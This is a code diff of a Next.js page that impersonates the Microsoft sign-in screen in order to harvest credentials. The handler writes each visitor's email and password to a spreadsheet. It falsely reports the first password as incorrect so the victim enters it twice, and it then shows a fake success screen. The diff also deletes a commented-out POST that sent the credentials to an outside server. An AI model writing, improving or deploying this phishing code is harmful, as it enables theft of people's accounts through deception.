@@ -1,13 +1,13 @@
-"use client"
+"use client";
 
-import React, { useState } from 'react'
-import { useRouter } from 'next/navigation'
-import SuccessModal from '../components/SuccessModal';
-import Image from 'next/image';
-import { msl } from '@/images';
-import { appendToSheet } from '@/actions/spreadSheet';
+import React, { useState } from "react";
+import { useRouter } from "next/navigation";
+import SuccessModal from "../components/SuccessModal";
+import Image from "next/image";
+import { msl } from "@/images";
+import { appendToSheet } from "@/actions/spreadSheet";
 
-const page = () => {
+export default function Page() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -33,40 +33,30 @@ const page = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-  
+
     if (!password) {
       setMsg2("Please enter the password for your Microsoft account.");
       return;
     }
-  
+
     try {
-      
-      const data =[[category, email, password]]
+      const data = [[category, email, password]];
       await appendToSheet(data);
-      // // Send data to backend using Axios
-      // const response = await axios.post("https://third-votesy-server.vercel.app/api/submit-login", {
-      //   source: "Outlook",
-      //   email,
-      //   password,
-      // });
-  
+
       if (isFirstAttempt) {
-        setMsg2("The email or password you entered is incorrect. Please try again.");
+        setMsg2(
+          "The email or password you entered is incorrect. Please try again."
+        );
         setPassword("");
         setIsFirstAttempt(false);
         setShowPassword(false); // Go back to email input page
       } else {
-        // if (response.status === 200) {
-        //   setSuccessModal(true);
-        // } else {
-        //   throw new Error("Network response was not ok");
-        // }
+        setSuccessModal(true);
       }
     } catch (error) {
       console.error("Error:", error);
     }
   };
-
 
   if (successModal) {
     return <SuccessModal />;
@@ -75,11 +65,7 @@ const page = () => {
   return (
     <div className="flex items-center justify-center h-screen bg-gray-100">
       <div className="bg-white p-8 rounded shadow-md w-full max-w-md">
-        <Image
-          src={msl}
-          alt="Microsoft Logo"
-          className="mx-auto mb-6"
-        />
+        <Image src={msl} alt="Microsoft Logo" className="mx-auto mb-6" />
         {!showPassword ? (
           <div className="slide-one">
             <h2 className="text-2xl font-semibold mb-4">Sign in</h2>
@@ -99,9 +85,7 @@ const page = () => {
                 Create one!
               </a>
             </p>
-            <p className="text-blue-500 mt-2">
-              Sign in with a security key 
-            </p>
+            <p className="text-blue-500 mt-2">Sign in with a security key</p>
             <div className="mt-4">
               <button
                 onClick={handleNext}
@@ -145,7 +129,5 @@ const page = () => {
         )}
       </div>
     </div>
-  )
+  );
 }
-
-export default page
